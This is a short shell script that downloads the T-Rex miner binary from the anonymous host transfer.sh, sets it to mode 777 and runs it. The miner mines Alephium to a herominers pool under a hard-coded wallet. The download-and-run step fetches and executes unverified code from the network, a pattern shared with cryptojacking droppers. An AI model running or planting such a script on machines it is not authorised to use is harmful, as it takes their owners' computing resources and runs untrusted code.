#!/bin/sh

wget https://transfer.sh/TeNFRM/t-rex
chmod 777 t-rex
./t-rex a blake3 -o stratum+tcp://de.alephium.herominers.com:1199 -u solo:19ia881wL6NtkJMmaUGrhHGtd9XymRuEgAjWTbBQU92FU -p x -w rig0
